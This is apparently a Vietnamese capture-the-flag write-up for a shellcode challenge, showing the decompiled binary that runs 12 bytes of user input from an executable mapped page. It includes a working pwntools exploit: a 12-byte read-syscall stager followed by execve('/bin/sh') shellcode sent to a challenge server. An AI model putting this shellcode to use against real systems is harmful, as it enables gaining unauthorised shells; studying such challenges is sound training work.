# PWN1

- mấy chall trước chỉ làm nóng ,đến chall này mới thật sự căng

## Ida 

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  setup(argc, argv, envp);
  buf = mmap((void *)0x1337000, 0x1000uLL, 7, 33, -1, 0LL);
  puts("Let warm up a bit with shellcode , shall we?");
  read(0, buf, 0xCuLL);
  puts("OK let see how your shellcode work!!!!");
  ((void (*)(void))buf)();
  return 0;
}
```

## Analysis
- thật sự lúc mới làm mình khá rối vì thấy NX mở, ý tưởng ban đầu của là sử dụng syscall mprotect để tạo 1 vùng địa chỉ execute được, nhưng chall chỉ giới hạn 12byte và ko có syscall sẵn nên chuyện đó bất thành
- đến tối thì nghe nói chall này ko khó thì mình xem lại, nhận ra địa chỉ thằng buf là 0x1337000 có quyền execute, lợi dụng việc này mình thực thi syscall read để viết được nhiều hơn, chú ý là tối ưu shellcode cho vừa 12byte nha

```python 
shellcode = asm(
    '''
    xor edi ,edi
    mov rsi, rax          
    mov rdx, rax                     
    xor eax, eax                        
    syscall
    ''', arch = 'amd64'
)
```
- sau đó ta nhập shellcode thực thi syscall execute để lấy shell thôi, nhớ padding qua phần shellcode read trước đó

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn1")

context.binary = exe

# p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*main+132
# c
# ''')

# input()

p = remote("103.162.14.116", 20001)

shellcode = asm(
    '''
    xor edi ,edi
    mov rsi, rax          
    mov rdx, rax                     
    xor eax, eax                        
    syscall
    ''', arch = 'amd64'
)

shellcode1 = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64'
)

p.send(shellcode)
p.send(b'a'*0xc + shellcode1)

#     mov rdi, 0                       
#     mov rsi, 0x1337000           
#     mov rdx, 0x100                       
#     mov rax, 0x0                        
#     syscall


p.interactive()
```

## FLAG

![image](https://github.com/gookoosss/CTF/assets/128712571/83751723-335a-41b8-99cb-e4701b7ff7f5)
